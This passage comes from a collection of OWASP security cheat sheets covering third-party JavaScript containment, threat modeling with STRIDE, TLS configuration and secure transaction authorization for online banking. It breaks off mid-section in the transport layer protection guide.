high risk applications, consider the use of [Content Security Policy (CSP)](https://www.w3.org/TR/CSP2/) in addition to iframe sandboxing. CSP makes hardening against XSS even stronger.\r\n\r\n```html\r\n<!-- Some host, e.g. somehost.com, HTML code here -->\r\n <html>\r\n   <head></head>\r\n     <body>\r\n       ...\r\n       <!-- Include iframe with 3rd party vendor javascript -->\r\n       <iframe\r\n       src=\"https://somehost-static.net/analytics.html\"\r\n       sandbox=\"allow-same-origin allow-scripts\">\r\n       </iframe>\r\n   </body>\r\n </html>\r\n\r\n<!-- somehost-static.net/analytics.html -->\r\n <html>\r\n   <head></head>\r\n     <body>\r\n       ...\r\n       <script>\r\n       window.addEventListener(\"message\", receiveMessage, false);\r\n       function receiveMessage(event) {\r\n         if (event.origin !== \"https://somehost.com:443\") {\r\n           return;\r\n         } else {\r\n         // Make some DOM here and initialize other\r\n        //data required for 3rd party code\r\n         }\r\n       }\r\n       </script>\r\n       <!-- 3rd party vendor javascript -->\r\n       <script src=\"https://analytics.vendor.com/v1.1/script.js\"></script>\r\n       <!-- /3rd party vendor javascript -->\r\n   </body>\r\n </html>\r\n```\r\n\r\n### Virtual iframe Containment\r\n\r\nThis technique creates iFrames that run asynchronously in relation to the main page. It also provides its own containment JavaScript that automates the dynamic implementation of the protected iFrames based on the marketing tag requirements.\r\n\r\n### Vendor Agreements\r\n\r\nYou can have the agreement or request for proposal with the 3rd parties require evidence that they have implemented secure coding and general corporate server access security. But in particular you need to determine the monitoring and control of their source code in order to prevent and detect malicious changes to that JavaScript.\r\n\r\n## MarTechSec\r\n\r\nMarketing Technology Security\r\n\r\nThis refers to all aspects of reducing the risk from marketing JavaScript. Controls include\r\n\r\n1. Contractual controls for risk reduction; the contracts with any MarTech company should include a requirement to show evidence of code security and code integrity monitoring.\r\n2. Contractual controls for risk transference: the contracts with any MarTech company could include a penalty for serving malicious JavaScript\r\n3. Technical controls for malicious JavaScript execution prevention; Virtual Iframes,\r\n4. Technical controls for malicious JavaScript identification; [Subresource Integrity](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity).\r\n5. Technical controls including client side JavaScript malicious behavior in penetration testing requirements.\r\n\r\n## MarSecOps\r\n\r\nMarketing Security Operations\r\n\r\nThis refers to the operational requirements to maintain some of the technical controls. This involves possible cooperation and information exchange between the marketing team, the martech provider and the run or operations team to update the information in the page controls (SRI hash change, changes in pages with SRI), the policies in the Virtual iFrames, tag manager configuration, data layer changes etc.\r\n\r\nThe most complete and preventive controls for any site containing non-trivial marketing tags are -\r\n\r\n1. A data layer that calls the marketing server or tag manager APIs , so that only your code executes on your page (inversion of control).\r\n\r\n2. [Subresource Integrity](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity).\r\n\r\n3. Virtual frame Containment.\r\n\r\nThe MarSecOps requirements to implement technical controls at the speed of change that marketing wants or without a significant number of dedicated resources, can make data layer and Subresource Integrity controls impractical.\r\n\r\n## References\r\n\r\n- [Widespread XSS Vulnerabilities in Ad Network Code Affecting Top Tier Publishers, Retailers](https://randywestergren.com/widespread-xss-vulnerabilities-ad-network-code-affecting-top-tier-publishers-retailers/).\r\n- [Inside and Beyond Ticketmaster: The Many Breaches of Magecart](https://www.riskiq.com/blog/labs/magecart-ticketmaster-breach/).\r\n- [Magecart – a malicious infrastructure for stealing payment details from online shops](https://www.clearskysec.com/magecart/).\r\n- [Compromised E-commerce Sites Lead to \"Magecart\"](https://www.riskiq.com/blog/labs/magecart-keylogger-injection/)\r\n- [Inbenta, blamed for Ticketmaster breach, admits it was hacked](https://www.zdnet.com/article/inbenta-blamed-for-ticketmaster-breach-says-other-sites-not-affected/).\r\n"
    },
    {
      "Threat_Modeling_Cheat_Sheet.md": "# Threat Modeling Cheat Sheet\r\n\r\n## Introduction\r\n\r\nThreat modeling is an important concept for modern application developers to understand. This goal of this cheatsheet is provide a concise, but actionable, reference for both those new to threat modeling and those seeking a refresher.\r\n\r\n## Overview\r\n\r\nIn the context of application security, threat modeling is a structured, repeatable process used to gain actionable insights into the security characteristics of a particular system. It involves modeling a system from a security perspective, identifying applicable threats based on this model, and determining responses to these threats. Threat modeling analyzes a system from an adversarial perspective, focusing on ways in which an attacker can exploit a system.\r\n\r\nThreat modeling is ideally performed early in the SDLC, such as during the design phase. Moreover, it is not something that is performed once and never again. A threat model is something that should be maintained, updated and refined alongside the system. Ideally, threat modeling should be integrated seamlessly into a team's normal SDLC process; it should be treated as standard and necessary step in the process, not an add-on.\r\n\r\nAccording to  the [Threat Model Manifesto](https://www.threatmodelingmanifesto.org/), the threat modeling process should answer the following four questions:\r\n\r\n1. What are we working on?\r\n2. What can go wrong?\r\n3. What are we going to do about it?\r\n4. Did we do a good enough job?\r\n\r\nThese four questions will act as the foundation for the four major phases described below.\r\n\r\n## Advantages\r\n\r\nBefore turning to an overview of the process, it may be worth addressing the question: why threat model? Why bother adding more work to the development process? What are the benefits? The following section will briefly outline some answers to these questions.\r\n\r\n### Improved Visibility of Target of Evaluation (TOE)\r\n\r\n Threat modeling requires a deep understanding of the system being evaluated. To properly threat model, one must understand data flows, trust boundaries, and other characteristics of the system. Thus, [Stiliyana Simeonova](https://securityintelligence.com/threat-modeling-in-the-enterprise-part-1-understanding-the-basics/) asserts that improved visibility into a system and its interactions is one advantage of threat modeling.\r\n\r\n### Increased Secuirty Awareness\r\n\r\nProper threat modeling requires participants to think creatively and critically about the security and threat landscape of a specific application. It challenges individuals to \"think like an attacker\" and apply general security knowledge to a specific context. Threat modeling is also typically a team effort with members being encouraged to share ideas and provide feedback on others. Overall, threat modeling can prove to be a highly educational activity that benefits participants.\r\n\r\n### Identify Risks Early-On\r\n\r\nThreat modeling seeks to identify potential security issues during the design phase. This allows security to be \"built-into\" a system rather than \"bolted-on\". This is far more efficient than having to identify and resolve security flaws after a system is in production.\r\n\r\n## High-Level Process\r\n\r\nMany threat modeling techniques, including PASTA, STRIDE, and OCTAVE have been developed  and utilized effectively in the industry. There is no universally accepted industry standard for the threat modeling process, no \"right\" answer for every use case. However, despite this diversity, most approaches do include the the processes of system modeling, threat identification, and risk response in some form. Inspired by these commonalities and guided by the four key questions of threat modeling discussed above, this cheatsheet will break the threat modeling down into four basic steps: application decomposition, threat identification and ranking, mitigations, and review and validation.\r\n\r\n### Application Decomposition\r\n\r\nThe step of application decomposition seeks to answer the question \"what are we building\"? Without understanding a system, one cannot truly understand what threats are most applicable to it; thus, this step provides a critical foundation for subsequent activities. Although different techniques may be used in this first step of threat modeling, data flow diagrams (DFDs) are arguably the most common approach.\r\n\r\nDFDs allow one to visually model a system and its interactions with data and other entities; they are created using a [small number of simple symbols](https://github.com/adamshostack/DFD3). DFDs may be created within dedicated threat modeling tools such as [OWASP's Threat Dragon](https://github.com/OWASP/threat-dragon) or [Microsoft' Threat Modeling Tool](https://learn.microsoft.com/en-us/azure/security/develop/threat-modeling-tool) or using general purpose diagraming solutions such as [draw.io](https://draw.io). Depending on the scale and complexity of the system being modeled, multiple DFDs may be required. For example, one could create a DFD representing a high-level overview of the entire system along with a number of more focused DFDs which detail sub-systems. Technical tools are not strictly necessary; whiteboarding may be sufficient in some instances, though it is preferable to have the DFDs in a form that can be easily stored, referenced, and updated as needed.\r\n\r\nRegardless of how a DFD or comparable model is generated, it is important that the solution provides a clear view of trust boundaries, data flows, data stores, processes, and the external entities which may interact with the system. These often represent possible attack points and provide crucial input for the subsequent steps.\r\n\r\n### Threat Identification and Ranking\r\n\r\nAfter the system has been modeled, it is now time to address the question of \"what can go wrong?\". This question must be explored with the inputs from the first step in mind; that is, it should focus on identifying and ranking threats within the context of the specific system being evaluated. In attempting to answer this question, threat modelers have a wealth of data sources and techniques at their disposal. For illustration purposes, this cheatsheet will leverage STRIDE; however, in practice, other approaches may be used alongside or instead of STRIDE.\r\n\r\nSTRIDE is a mature and popular threat modeling technique and mnemonic originally developed by Microsoft employees. To facilitate threat identification, STRIDE groups threats into one of six general categories and prompts modelers to systematically consider how these general threats may materialize within the context of the specific system being evaluated. Each STRIDE category may be considered a violation of a desirable security attribute; the categories and associated desirable attributes are are as follows:\r\n\r\n| Threat Category             | Violates          | Examples                                                                                                    |\r\n|-----------------------------|-------------------|-------------------------------------------------------------------------------------------------------------|\r\n| **S**poofing                | Authenticity      | An attacker steals the authentication token of a legitimate user and uses it to impersonate the user.       |\r\n| **T**ampering               | Integrity         | An attacker abuses the application to perform unintended updates to a database.                             |\r\n| **R**epudiation             | Non-repudiability | An attacker manipulates logs to cover their actions.                                                        |\r\n| **I**nformation Disclosure  | Confidentiality   | An attacker extract data from a database containing user account info.                                      |\r\n| **D**enial of Service       | Availability      | An attacker locks a legitimate user out of their account by performing many failed authentication attempts. |\r\n| **E**levation of Privileges | Authorization     | An attacker tampers with a JWT to change their role.                                                        |\r\n\r\nSTRIDE provides valuable structure for responding to the question of \"what can go wrong\". It is also a highly flexible approach and getting started need not be complex. Simple techniques such as brainstorming and whiteboarding or even [games](https://github.com/adamshostack/eop/) may be used initially. STRIDE categories are also incorporated into popular threat modeling tools such as [OWASP's Threat Dragon](https://github.com/OWASP/threat-dragon) and [Microsoft' Threat Modeling Tool](https://learn.microsoft.com/en-us/azure/security/develop/threat-modeling-tool). Additionally, as a relatively high-level process, STRIDE pairs well with more tactical approaches such as kill chains or [MITRE ATT&CK](https://attack.mitre.org/) (please refer to [this article](https://blog.isc2.org/isc2_blog/2020/02/under-attack-how-mitres-methodology-to-find-threats-and-embed-counter-measures-might-work-in-your-or.html) for an overview of how STRIDE and ATT&CK can work together).\r\n\r\nAfter possible threats have been identified, they must be ranked. Ranking should generally be based on the product of an identified threat's likelihood and its impact. A threat that is likely to occur and result in serious damage would be prioritized much higher than one that is unlikely to occur and would only have a moderate impact.\r\n\r\n### Response and Mitigations\r\n\r\nEquipped with an understanding of both the system and applicable threats, it is now time to answer \"what are we going to do about it\"?. Each threat identified earlier must have a response. Threat responses are similar, but not identical, to risk responses. [Adam Shostack](https://shostack.org/resources/threat-modeling) lists the following responses:\r\n\r\n- Mitigate. Take action to reduce the likelihood that the threat will materialize.\r\n- Eliminate: Simply remove the feature or component that is causing the threat.\r\n- Transfer. Shift responsibility to another entity such as the customer.\r\n- Accept. Do not mitigate, eliminate, or transfer the risk because none of the above options are acceptable given business requirements or constraints.\r\n\r\nIf one decides to mitigates a threat, mitigation strategies must be formulated and documented as requirements.  Depending on the complexity of the system, nature of threats identified, and the process used for identifying threats (STRIDE or another method), mitigation responses may be applied at either the category or individual threat level. In the former case, the mitigation would apply to all threats within that category. Mitigations strategies must be actionable not hypothetical; they must be something that can actually be built into to the system being developed. Although mitigations strategies must be tailored to the particular application, resources such as as [OWASP's ASVS](https://owasp.org/www-project-application-security-verification-standard/) and [MITRE's CWE list](https://cwe.mitre.org/index.html) can prove valuable when formulating these responses.\r\n\r\n### Review and Validation\r\n\r\nFinally, it is time to answer the question \"did we do a good enough job\"? The threat model must be reviewed by all stakeholders, not just the development or security teams. Areas to focus on include:\r\n\r\n- Does the DFD (or comparable) accurately reflect the system?\r\n- Have all threats been identified?\r\n- For each identified threat, has a response strategy been agreed upon?\r\n- For identified threats for which mitigation is the desired response, have mitigation strategies been developed which reduce risk to an acceptable level?\r\n- Has the threat model been formally documented? Are artifacts from the threat model process stored in such a way that it can be accessed by those with \"need to know\"?\r\n- Can the agreed upon mitigations be tested? Can success or failure of the requirements and recommendations from the the threat model be measured?\r\n\r\n## References\r\n\r\n### General Reference\r\n\r\n- [Awesome Threat Modeling](https://github.com/hysnsec/awesome-threat-modelling) - resource list\r\n- [Tactical Threat Modeling](https://safecode.org/wp-content/uploads/2017/05/SAFECode_TM_Whitepaper.pdf)\r\n- [Threat Modeling: A Summary of Available Methods](https://insights.sei.cmu.edu/library/threat-modeling-a-summary-of-available-methods/)\r\n- [Threat Modeling Handbook](https://security.cms.gov/policy-guidance/threat-modeling-handbook)\r\n- [Threat Modeling Process](https://owasp.org/www-community/Threat_Modeling_Process)\r\n- [The Ultimate Beginner's Guide to Threat Modeling](https://shostack.org/resources/threat-modeling)\r\n\r\n### Methods and Techniques\r\n\r\n- [LINDDUN](https://linddun.org/)\r\n- [OCTAVE](https://insights.sei.cmu.edu/library/introduction-to-the-octave-approach/)\r\n- [PASTA](https://cdn2.hubspot.net/hubfs/4598121/Content%20PDFs/VerSprite-PASTA-Threat-Modeling-Process-for-Attack-Simulation-Threat-Analysis.pdf)\r\n- [STRIDE](https://learn.microsoft.com/en-us/previous-versions/commerce-server/ee823878(v=cs.20)?redirectedfrom=MSDN)\r\n- [TRIKE](http://www.octotrike.org/papers/Trike_v1_Methodology_Document-draft.pdf)\r\n- [VAST](https://go.threatmodeler.com/vast-methodology-data-sheet)\r\n\r\n### Tools\r\n\r\n- [Cairis](https://github.com/cairis-platform/cairis)\r\n- [draw.io](https://draw.io) - see also [threat modeling libraries](https://github.com/michenriksen/drawio-threatmodeling) for the tool\r\n- [IriusRisk](https://www.iriusrisk.com/) - offers a free Community Edition\r\n- [Microsoft Threat Modeling Tool](https://learn.microsoft.com/en-us/azure/security/develop/threat-modeling-tool)\r\n- [OWASP's Threat Dragon](https://github.com/OWASP/threat-dragon)\r\n"
    },
    {
      "TLS_Cipher_String_Cheat_Sheet.md": "# TLS Cipher String Cheat Sheet\r\n\r\n## Introduction\r\n\r\nThe Mozilla Foundation provides an easy-to-use secure configuration generator for web, database, and mail software. This online (and well updated) tools allows site administrators to select the software they are using and receive a configuration file that is both safe and compatible for a wide variety of browser versions and server software.\r\n\r\nFor more information please visit [https://ssl-config.mozilla.org/](https://ssl-config.mozilla.org/).\r\n\r\n## Related Articles\r\n\r\n- [OWASP: Transport Layer Protection Cheat Sheet](Transport_Layer_Protection_Cheat_Sheet.md).\r\n- [Mozilla Server Side TLS](https://wiki.mozilla.org/Security/Server_Side_TLS)\r\n"
    },
    {
      "Transaction_Authorization_Cheat_Sheet.md": "# Transaction Authorization Cheat Sheet\r\n\r\n## Purpose and audience\r\n\r\nThe Purpose of this cheat sheet is to provide guidelines on how to securely implement transaction authorization to protect it from being bypassed. These guidelines can be used by:\r\n\r\n- **Banks** - to define functional and non-functional requirements for transaction authorization.\r\n- **Developers** – to design and implement transaction authorization without vulnerabilities.\r\n- **Pentesters** – to test for transaction authorization security.\r\n\r\n## Introduction\r\n\r\nSome applications use a second factor to check whether an authorized user is performing sensitive operations. A common example is wire transfer authorization, typically used in online or mobile banking applications.\r\n\r\nFor the purpose of this document we will call that process: *transaction authorization*.\r\n\r\nUsage scenarios are not only limited to financial systems. For example: an email with a secret code or a link with some kind of token to unlock a user account is also a special case of transaction authorization. A user authorizes the operation of account unlocking by using a second factor (a unique code sent to his email address). Transaction authorization can be implemented using various methods, e.g.:\r\n\r\n- Cards with transaction authorization numbers (TAN),\r\n- Time based OTP tokens, such as [OATH TOTP (Time-based One-Time Password)](https://en.wikipedia.org/wiki/Time-based_One-time_Password_Algorithm),\r\n- OTP sent by SMS or provided by phone\r\n- Digital signature using e.g. a smart card or a smart phone,\r\n- Challenge-response tokens, including unconnected card readers or solutions which scan transaction data from the user's computer screen.\r\n\r\nSome of these can be implemented on a physical device or in a mobile application.\r\n\r\nTransaction authorization is implemented in order to protect for unauthorized wire transfers as a result of attacks using malware, phishing, password or session hijacking, CSRF, XSS, etc.. Unfortunately, as with any piece of code, this protection can be improperly implemented and as a result it might be possible to bypass this safeguard.\r\n\r\n## 1. Functional Guidelines\r\n\r\n### 1.1 Transaction authorization method has to allow a user to identify and acknowledge significant transaction data\r\n\r\nUser's computers cannot be trusted due to malware threats. Hence a method that prevents a user from identifying transaction on an external device cannot be considered as secure. Transaction data should be presented and acknowledged using an external authorization component.\r\n\r\nSuch transaction authorization components should be built using the *What You See Is What You Sign* principle. When a user authorizes a transaction they need to know what they are authorizing. Based on this principle, an authorization method must permit a user to identify and acknowledge the data that is significant to a given transaction. For example, in the case of a wire transfer: the target account and amount.\r\n\r\nThe decision about which transaction data can be considered as significant should be chosen based on:\r\n\r\n- The real risk,\r\n- The technical capabilities and constraints of the chosen authorization method,\r\n- Positive user experience.\r\n\r\nFor example when an SMS message is used to send significant transaction data, it is possible to send the target account, amount and type of transfer. However, for an unconnected [CAP reader](https://en.wikipedia.org/wiki/Chip_Authentication_Program) it is perceived to be inconvenient for a user to enter these data. In such cases, entering only the most significant transaction data (e.g. partial target account number and amount) can be considered sufficient.\r\n\r\nIn general, significant transaction data should always be presented as an inherent part of the transaction authorization process. Whereas the user experience should be designed to encourage users to verify the transaction data.\r\n\r\nIf a transaction process requires a user to enter transaction data into an external device, the user should be prompted for providing specific value (e.g. a target account number). Entering a value without meaningful prompt could be easily abused by malware using social engineering techniques as described in the example in paragraph 1.4. Also, for more detailed discussion of input overloading problems, see [here](http://www.cl.cam.ac.uk/~sjm217/papers/fc09optimised.pdf).\r\n\r\n### 1.2 Change of authorization token should be authorized using the current authorization token\r\n\r\nWhen a user is allowed to change authorization token by using the application interface, the operation should be authorized by using his current authorization credentials (as is the case with [password change procedure](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/04-Authentication_Testing/09-Testing_for_Weak_Password_Change_or_Reset_Functionalities.html)). For example: when a user changes a phone number for SMS codes an authorization SMS code should be sent to the current phone number.\r\n\r\n### 1.3 Change of authorization method should be authorized using the current authorization method\r\n\r\nSome applications allow a user to chose between multiple methods of transaction authorization. In such cases, the user should authorize the change in authorization method using his current authorization method. Otherwise, malware may change the authorization method to the most vulnerable method.\r\n\r\nAdditionally, the application should inform the user about the potential dangers associated to the selected authorization method.\r\n\r\n### 1.4 Users should be able to easily distinguish the authentication process from the transaction authorization process\r\n\r\nMalware can trick users in authorizing fraudulent operations, when an application requires a user to perform the same actions for authentication as for transaction authorization. Consider the following example:\r\n\r\n- An application is using the same method for user authentication (usually as a second factor to traditional login/password) and for transaction authorization. E.g. by using a OTP token, Challenge-response codes, operation signing using external smartcard, ...\r\n- A malware may present the user a false error message after the first step (authentication to the application) and trick the user into repeating the authentication procedure. The first authentication code will be used by the malware for authentication, whereas the second code would be used to authorize a fraudulent transaction. Even challenge-response schemes could be abused using this scenario as malware can present a challenge taken from a fraudulent transaction and trick the user to provide response. Such an attack scenario is used widely in [malware attacks against electronic banking](http://securityintelligence.com/back-basics-malware-authors-downgrade-tactics-stay-radar/#.VX_qI_krLDc).\r\n\r\nIn the abovementioned scenario, the same method was used to authenticate the user and to authorize the transaction. Malware can abuse this behavior to extract transaction authorization credentials without the user's knowledge. Social engineering methods [can be used despite utilized authentication and operation authorization methods](http://securityintelligence.com/tatanga-attack-exposes-chiptan-weaknesses/#.VZAy9PkrLDc) but the application shouldn't simplify such attack scenarios.\r\n\r\nSafeguards should allow the user to easily distinguish authentication from transaction authorization. This could be achieved by:\r\n\r\n- Using different methods to authenticate and to authorize,\r\n- Or using different actions in an external security component (e.g. different mode of operation in CAP reader),\r\n- Or presenting the user a clear message about what they are \"signing\" (What You See Is What You Sign Principle).\r\n\r\n### 1.5 Each transaction should be authorized using unique authorization credentials\r\n\r\nSome applications are asking for transaction authorization credentials only once, e.g. static password, code sent through SMS, token response. Afterwards a user is able to authorize any transaction during the whole user's session or at least they have to reuse the same credentials each time they need to authorize a transaction. Such behavior is not sufficient to prevent malware attacks because malware will sniff such credentials and use them to authorize any transaction without the user's knowledge.\r\n\r\n## 2. Non-functional guidelines\r\n\r\n### 2.1 Authorization should be performed and enforced server-side\r\n\r\nAs for [all other security controls](https://cwe.mitre.org/data/definitions/602.html) transaction authorization should be enforced server-side. By no means it should be possible to influence the authorization result by altering data which flows from a client to a server, e.g. by:\r\n\r\n- Tampering with parameters that contain transaction data,\r\n- Adding/removing parameters which will disable authorization check,\r\n- Causing an error.\r\n\r\nTo achieve this, security programming best practices should be applied, such as:\r\n\r\n- [Default deny](https://wiki.owasp.org/index.php/Positive_security_model).\r\n- Avoiding debugging functionality in production code.\r\n\r\nTo avoid tampering, additional safeguards should be considered. For example by cryptographically protecting the data for confidentiality and integrity and while decrypting and verifying the data server side.\r\n\r\n### 2.2 Authorization method should be enforced server side\r\n\r\nWhen multiple transaction authorization methods are available to the user. The server should enforce the use of the current authorization method chosen by the user in the application settings or enforced by application policies. It should be impossible to change an authorization method by manipulating the parameters provided from the client. Otherwise, malware can downgrade an authorization method to a less or even the least secure authorization method.\r\n\r\nThis is especially important when an application is developed to add a new, more secure authorization method. It is not very rare,that a new authorization method is built on top of an old codebase. As a result, when a client is sending parameters using the old method, the transaction may be authorized, despite the fact that the user has already switched to a new method.\r\n\r\n### 2.3 Transaction verification data should be generated server-side\r\n\r\nWhen significant transaction data are transmitted programmatically to an authorization component, extra care should be put into denying client modifications on the transaction data at authorization. Significant transaction data that has to be verified by the user, should be generated and stored on a server, then passed to an authorization component without any possibility of tampering by the client.\r\n\r\nA common anti pattern is to collect significant transaction data client-side and pass it to the server. In such cases, malware can manipulate these data and as a result, show faked transaction data in an authorization component.\r\n\r\n### 2.4 Application should prevent authorization credentials brute-forcing\r\n\r\nWhen transaction authorization credentials are sent to the server for verification, an application has to prevent brute-forcing. The transaction authorization process must be restarted after number of failed authorization attempts. In addition other anti brute-forcing and anti-automation techniques should be considered to prevent an attacker from automating his attacks,see [OWASP Authentication Cheat Sheet](Authentication_Cheat_Sheet.md#prevent-brute-force-attacks).\r\n\r\n### 2.5 Application should control which transaction state transitions are allowed\r\n\r\nTransaction authorization is usually performed in multiple steps, e.g.:\r\n\r\n1. The user enters the transaction data.\r\n2. The user requests authorization.\r\n3. The application initializes an authorization mechanism.\r\n4. The user verifies/confirms the transaction data.\r\n5. The user responds with the authorization credentials.\r\n6. The application validates authorization and executes a transaction.\r\n\r\nAn application should process such business logic flow in sequential step order and preventing a user from performing these steps out of order or in even skipping any of these steps (see [OWASP ASVS](https://owasp.org/www-project-application-security-verification-standard/) requirement **15.1**).\r\n\r\nThis should protect against attack techniques such as:\r\n\r\n- Overwriting transaction data before user will enter the authorization credentials,\r\n- Skipping transaction authorization.\r\n\r\n### 2.6 Transaction data should be protected against modification\r\n\r\nThe transaction authorization process should protect against attack scenarios that modify transaction data after the initial entry by the user. For example, a bad implementation of a transaction authorization process may allow the following attacks (for reference, see steps of transaction authorization described in paragraph 2.5):\r\n\r\n- Replaying step 1 (sending transaction data) in the background and overwriting transaction details with fraudulent transaction, before the user enters authorization credentials.\r\n- Adding parameters with transaction data to a HTTP request which authorizes the transaction. In such a case, poor implementation will authorize the initial transaction and then execute a fraudulent transaction (specific example of [Time of Check to Time of Use vulnerability](https://cwe.mitre.org/data/definitions/367.html)).\r\n\r\nThe protection against modification could be implemented using various techniques depending on the framework used, but one or more of the following should be present:\r\n\r\n- Any modification of transaction data should trigger invalidation of any previously entered authorization data. E.g. Generated OTP or challenge is invalidated.\r\n- Any modification of transaction data should trigger reset of the authorization process.\r\n- Any attempts to modify transaction data after the initial entry by the user is a symptom of tinkering with an application and should be logged, monitored and carefully investigated.\r\n\r\n### 2.7 Confidentiality of the transaction data should be protected during any client / server communications\r\n\r\nThe transaction authorization process should protect the privacy of transaction data being presented to the user to authorize i.e. at section 2.5, steps 2 and 4.\r\n\r\n### 2.8 When a transaction is executed, the system should check whether it was authorized\r\n\r\nThe result of the transaction entry and the authorization process described in paragraph 2.5 is the transaction execution. Just before the transaction is executed there should be a final control gate which verifies whether the transaction was properly authorized by the user. Such control, tied to execution, should prevent attacks such as:\r\n\r\n- Time of Check to Time of Use (TOCTOU) – example in paragraph 2.6\r\n- Skipping authorization check in the transaction entry process (see. paragraph 2.5)\r\n\r\n### 2.9 Authorization credentials should be valid only by limited period of time\r\n\r\nIn some malware attacks scenarios, authorization credentials entered by the user is passed to malware command and control server (C&C) and then used from an attacker-controlled machine. Such a process is often performed manually by an attacker. To make such attacks difficult, the server should allow authorizing the transaction only in a limited time window between generating of challenge or OTP and the transaction authorization. Additionally, such safeguard will also aid in preventing resource exhaustion attacks. The time window should be carefully selected to not disrupt normal users' behavior.\r\n\r\n### 2.10 Authorization credentials should be unique for every operation\r\n\r\nTo prevent all sorts of replay attacks, authorization credentials should be unique for every operation. It could be achieved using different methods depending on the applied transaction authorization mechanism. For example: using a timestamp, a sequence number or a random value in signed transaction data or as a part of a challenge.\r\n\r\n## Remarks\r\n\r\nWe identify other issues that should be taken into consideration while implementing transaction authorization. However we deem to be beyond the scope of this cheat sheet:\r\n\r\n- Which transactions should be authorized? All transactions or only some of them. Each application is different and an application owner should decide if all transactions should be authorized or only some of them, considering risk analysis, risk exposition of given application, and other safeguards implemented in an application.\r\n- We recommend the use of cryptographic operations to protect transactions and to ensure integrity, confidentiality and non-repudiation.\r\n- Device enrolment or \"pairing\" of an external authorization device (or a mobile application) with the user account.\r\n- Provisioning & protection of the device signing keys, during device \"pairing\" is as critical as the signing protocol itself. Malware may attempt to inject/replace or steal the signing keys.\r\n- User awareness. E.g.: For transaction authorization methods, when a user types-in significant transaction data to an authorization component (e.g. an external dedicated device or a mobile application), users should be trained to rewrite transaction data from trusted source and not from a computer screen.\r\n- There are some anti-malware solutions that protect against malware threats but such solutions [do not guarantee 100% effectiveness](http://www.securing.pl/en/script-based-malware-detection-in-online-banking-security-overview/index.html) and should be used only as an additional layer of protection.\r\n- Protection of the signing keys using a second factor either be password, biometric, etc..\r\n- Protection of the signing keys leveraging secure elements (TEE, TPM, Smart card..)\r\n\r\n## References and future reading\r\n\r\nReferences and future reading:\r\n\r\n- Wojciech Dworakowski: [E-banking transaction authorization - possible vulnerabilities, security verification and best practices for implementation. Presentation from AppSec EU 2015](http://www.slideshare.net/wojdwo/ebanking-transaction-authorization-appsec-eu-2015-amsterdam).\r\n- Saar Drimer, Steven J. Murdoch, and Ross Anderson: [Optimised to Fail - Card Readers for Online Banking](http://www.cl.cam.ac.uk/~sjm217/papers/fc09optimised.pdf).\r\n- Jakub Kałużny, Mateusz Olejarka: [Script-based Malware Detection in Online Banking Security Overview](http://www.securing.pl/en/script-based-malware-detection-in-online-banking-security-overview/index.html).\r\n- [List of websites and whether or not they support 2FA](https://twofactorauth.org/).\r\n- Laerte Peotta, Marcelo D. Holtz, Bernardo M. David, Flavio G. Deus, Rafael Timóteo de Sousa Jr: [A Formal Classification Of Internet Banking Attacks and Vulnerabilities](http://airccse.org/journal/jcsit/0211ijcsit13.pdf).\r\n- Marco Morana, Tony Ucedavelez: [Threat Modeling of Banking Malware-Based Attacks](https://owasp.org/www-pdf-archive/Marco_Morana_and_Tony_UV_-_Threat_Modeling_of_Banking_Malware.pdf).\r\n- OWASP [Anti-Malware - Knowledge Base](https://wiki.owasp.org/index.php/OWASP_Anti-Malware_-_Knowledge_Base).\r\n- OWASP [Anti-Malware Project - Awareness Program](https://wiki.owasp.org/index.php/OWASP_Anti-Malware_Project_-_Awareness_Program).\r\n- Arjan Blom , Gerhard de Koning Gans , Erik Poll , Joeri de Ruiter , and Roel Verdult: [Designed to Fail - A USB-Connected Reader for Online Banking](http://www.cs.ru.nl/~rverdult/Designed_to_Fail_A_USB-Connected_Reader_for_Online_Banking-NORDSEC_2012.pdf).\r\n"
    },
    {
      "Transport_Layer_Protection_Cheat_Sheet.md": "# Transport Layer Protection Cheat Sheet\r\n\r\n## Introduction\r\n\r\nThis cheat sheet provides guidance on how to implement transport layer protection for an application using Transport Layer Security (TLS). When correctly implemented, TLS can provides a number of security benefits:\r\n\r\n- Confidentiality - protection against an attacker from reading the contents of traffic.\r\n- Integrity - protection against an attacker modifying traffic.\r\n- Replay prevention - protection against an attacker replaying requests against the server.\r\n- Authentication - allowing the client to verify that they are connected to the real server (note that the identity of the *client* is not verified unless client certificates are used).\r\n\r\nTLS is used by many other protocols to provide encryption and integrity, and can be used in a number of different ways. This cheatsheet is primarily focused on how to use TLS to protect clients connecting to a web application over HTTPS; although much of the guidance is also applicable to other uses of TLS.\r\n\r\n### SSL vs TLS\r\n\r\nSecure Socket Layer (SSL) was the original protocol that was used to provide encryption for HTTP traffic, in the form of HTTPS. There were two publicly released versions of SSL - versions 2 and 3. Both of these have serious cryptographic weaknesses and should no longer be used.\r\n\r\nFor [various reasons](http://tim.dierks.org/2014/05/security-standards-and-name-changes-in.html) the next version of the protocol (effectively SSL 3.1) was named Transport Layer Security (TLS) version 1.0. Subsequently TLS versions 1.1, 1.2 and 1.3 have been released.\r\n\r\nThe terms \"SSL\", \"SSL/TLS\" and \"TLS\" are frequently used interchangeably, and in many cases \"SSL\" is used when referring to the more modern TLS protocol. This cheatsheet will use the term \"TLS\" except where referring to the legacy protocols.\r\n\r\n## Server Configuration\r\n\r\n### Only Support Strong Protocols\r\n\r\nThe SSL protocols have a large number of weaknesses, and should not be used in any circumstances. General purpose web applications should default to TLS 1.3 (support TLS 1.2 if necessary) with all other protocols disabled. Where it is known that a web server must support legacy clients with unsupported an insecure browsers (such as Internet Explorer 10), it may be necessary to enable TLS 1.0 to provide support.\r\n\r\nWhere legacy protocols are required, the [\"TLS_FALLBACK_SCSV\" extension](https://tools.ietf.org/html/rfc7507) should be enabled in order to prevent downgrade attacks against clients.\r\n\r\nNote that PCI DSS [forbids the use of legacy protocols such as TLS 1.0](https://www.pcisecuritystandards.org/documents/Migrating-from-SSL-Early-TLS-Info-Supp-v1_1.pdf).\r\n\r\n### Only Support Strong Ciphers\r\n\r\nThere are a large number of different ciphers (or cipher suites) that are supported by TLS, that provide varying levels of security. Where possible, only GCM ciphers should be enabled. However, if it is necessary to support legacy clients, then other ciphers may be required.\r\n\r\nAt a minimum, the following types of ciphers should always be disabled:\r\n\r\n- Null ciphers\r\n- Anonymous ciphers\r\n- EXPORT ciphers\r\n\r\nSee the [TLS Cipher String Cheat Sheet](TLS_Cipher_String_Cheat_Sheet.md) for full details on securely configuring ciphers.\r\n\r\n### Use Strong Diffie-Hellman 